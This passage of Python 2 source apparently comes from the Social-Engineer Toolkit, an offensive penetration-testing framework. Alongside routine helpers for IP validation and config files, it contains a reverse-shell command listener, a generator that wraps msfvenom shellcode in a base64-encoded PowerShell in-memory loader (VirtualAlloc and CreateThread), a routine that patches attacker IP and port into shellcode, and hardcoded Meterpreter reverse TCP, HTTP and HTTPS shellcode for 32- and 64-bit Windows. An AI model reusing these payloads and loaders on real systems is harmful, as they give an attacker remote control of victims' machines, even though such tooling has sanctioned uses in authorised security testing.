            # okay its an integer lets do the compare
            if choice > max:
                # trigger an exception as not an int
                choice = "blah"
                choice = int(choice)
            # if everythings good return the right choice
            return choice
        # oops, not a integer 
        except Exception:
            counter = 1

# valid if IP address is legit
def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)

# ipv4
def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# ipv6
def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           #   A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           #   Another group
            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           #   Last group
            (?: (?<=::)             #   Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          #   A v4 address with NO leading zeros 
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None


# kill certain processes
def kill_proc(port,flag):
    proc=subprocess.Popen("netstat -antp | grep '%s'" % (port), shell=True, stdout=subprocess.PIPE)
    stdout_value=proc.communicate()[0]
    a=re.search("\d+/%s" % (flag), stdout_value)
    if a:
        b=a.group()
        b=b.replace("/%s" % (flag),"")
        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


# check the config file and return value
def check_config(param):
    fileopen = file("%s/config/set_config" % (definepath), "r")
    for line in fileopen:
        # if the line starts with the param we want then we are set, otherwise if it starts with a # then ignore
        if line.startswith(param) != "#":
            if line.startswith(param):
                line = line.rstrip()
                # remove any quotes or single quotes
                line = line.replace('"', "")
                line = line.replace("'", "")
                line = line.split("=")
                return line[1]



# copy files from directory
def copyfolder(sourcePath, destPath):
  for root, dirs, files in os.walk(sourcePath):

    #figure out where we're going
    dest = destPath + root.replace(sourcePath, '')
    
    #if we're in a directory that doesn't exist in the destination folder
    #then create a new folder
    if not os.path.isdir(dest):
        os.mkdir(dest)
        #print('Directory created at: ' + dest)

    #loop through all files in the directory
    for f in files:

        #compute current (old) & new file locations
        oldLoc = root + '/' + f
        newLoc = dest + '/' + f

        if not os.path.isfile(newLoc):
            try:
                shutil.copy2(oldLoc, newLoc)
            except IOError:
		pass


# this routine will be used to check config options within the set.options
def check_options(option):
    # open the directory
    trigger = 0        
    fileopen = file("%s/src/program_junk/set.options" % (definepath), "r").readlines()
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = line.rstrip()
            line = line.replace('"', "")
            line = line.split("=")
            return line[1] 
            trigger = 1
    if trigger == 0: return trigger

# future home to update one localized set configuration file
def update_options(option):
        # if the file isn't there write a blank file
        if not os.path.isfile("%s/src/program_junk/set.options" % (definepath)):
                filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
                filewrite.write("")
                filewrite.close()
        # append to file
        filewrite = file("%s/src/program_junk/set.options" % (definepath), "a")
        filewrite.write(option + "\n")
        filewrite.close()
 
# python socket listener
def socket_listener(port):
    port = int(port)          # needed integer for port
    host = ''                 # Symbolic name meaning the local host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print "Listening on 0.0.0.0:%s" % str(port)
    # listen for only 1000 connection
    s.listen(1000)
    conn, addr = s.accept()
    print 'Connected by', addr
    data = conn.recv(1024)
    # start loop

    while 1:
        command = raw_input("Enter shell command or quit: ")
        conn.send(command)
        # if we specify quit then break out of loop and close socket
        if command == "quit": break
        data = conn.recv(1024)
        print data
    conn.close()

# generates powershell payload
def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
    # grab the metasploit path
    msf_path = meta_path()
    # generate payload
    if payload2 == "":
	    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    	    data = proc.communicate()[0]
    else:
	data = payload2
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # sub in \x for 0x
    data = re.sub("\\\\x", "0x", data)
    # base counter
    counter = 0
    # count every four characters then trigger mesh and write out data
    mesh = ""
    # ultimate string
    newdata = ""
    for line in data:
        mesh = mesh + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + mesh + ","
            mesh = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]

    # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
    powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
    ##############################################################################################################################################################################
    # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
    # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
    ##############################################################################################################################################################################

    # blank command will store our fixed unicode variable
    blank_command = ""
    # loop through each character and insert null byte
    for char in powershell_command:
        # insert the nullbyte
        blank_command += char + "\x00"

    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command)
    # return the powershell code
    return powershell_command

def generate_shellcode(payload,ipaddr,port):
    msf_path = meta_path()
    # generate payload
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # return data
    return data

# this will take input for shellcode and do a replace for IP addresses
def shellcode_replace(ipaddr, port, shellcode):
	# split up the ip address
	ip = ipaddr.split('.')
	# join the ipaddress into hex value spaces still in tact
	ipaddr = ' '.join((hex(int(i))[2:] for i in ip))
	# We use a default 255.254.253.252 on all shellcode then replace
	# 255.254.253.252 --> hex --> ff fe fd fc
	# 443 = '0x1bb'
	if port != "443":
		port = hex(int(port))
		# hack job in order to get ports into right format
		# if we are only using three numbers then you have to flux in a zero
		if len(port) == 5:
			port = port.replace("0x", "\\x0")
		else:
			port = port.replace("0x", "\\x")
		# here we break the counters down a bit to get the port into the right format
		counter = 0
		new_port = ""
		for a in port:
			if counter < 4:
				new_port += a
			if counter == 4:
				new_port += "\\x" + a
				counter = 0
			counter = counter + 1
		# redefine the port in hex here
		port = new_port
	#ipaddr = "\\x" + ipaddr
	ipaddr = ipaddr.split(" ")
	first = ipaddr[0]
	# split these up to make sure its in the right format
	if len(first) == 1:
		first = "0" + first
	second = ipaddr[1]
	if len(second) == 1:
		second = "0" + second
	third = ipaddr[2]
	if len(third) == 1:
		third = "0" + third
	fourth = ipaddr[3]
	if len(fourth) == 1:
		fourth = "0" + fourth
	# put the ipaddress into the right format
	ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
	shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)
	if port != "443":
		# getting everything into the right format
		if len(port) > 4:
			port = "\\x00" + port
		# if we are using a low number like 21, 23, etc. 
		if len(port) == 4:
			port = "\\x00\\x00" + port
		shellcode = shellcode.replace(r"\x00\x01\xbb", port)
	# return shellcode
	return shellcode

# exit routine
def exit_set():
    cleanup_routine()
    print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"
    sys.exit()


# these are payloads that are callable

def metasploit_shellcode(payload):
	counter = 0
	if payload == "windows/meterpreter/reverse_tcp":
		# shellcode for meterpreter reverse_tcp
		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
		counter = 1
	if payload == "windows/x64/meterpreter/reverse_tcp":
		return r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
		counter = 1
	if payload == "windows/meterpreter/reverse_https":
		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x50\x6b\x57\x4a\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
		counter = 1
	if payload == "windows/meterpreter/reverse_http":
		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x4b\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x34\x59\x31\xd2\x52\x68\x00\x02\x20\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xe9\xeb\x49\xe8\xc7\xff\xff\xff\x2f\x4b\x51\x77\x49\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x65\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
		counter = 1
	if payload == "windows/meterpreter/reverse_tcp_allports":
		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x12\x31\xc0\x66\x8b\x46\x02\x86\xe0\x66\x40\x86\xe0\x66\x89\x46\x02\xeb\xdf\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
		counter = 1
	if counter == 0:
		return ""
